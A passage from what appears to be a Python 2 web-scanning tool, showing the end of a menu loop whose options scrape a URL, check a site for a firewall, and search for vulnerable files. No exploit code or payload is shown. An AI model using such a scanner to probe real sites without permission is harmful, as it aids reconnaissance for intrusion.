        log = log.lower()
        if log == "t":
            log = True
        elif log == "f":
            log = False
        else:
            log = False

        scrapeURL(parseUrl(url), log, "t", "t", False)
        cls()
        scraperChoose()
        
    if scrapetype.strip() == "6":
        cls()
        url = raw_input("Link To Scan: \n> ")
        checkFirewall(parseUrl(url))
        cls()
        scraperChoose()

    if scrapetype.strip() == "7":
        cls()
        url = raw_input("Link To Scan: \n> ")
        findVulnFiles(parseUrl(url))
        cls()
        scraperChoose()

    else:
        cls()
        scraperChoose()
if __name__ == "__main__":
    scraperChoose()
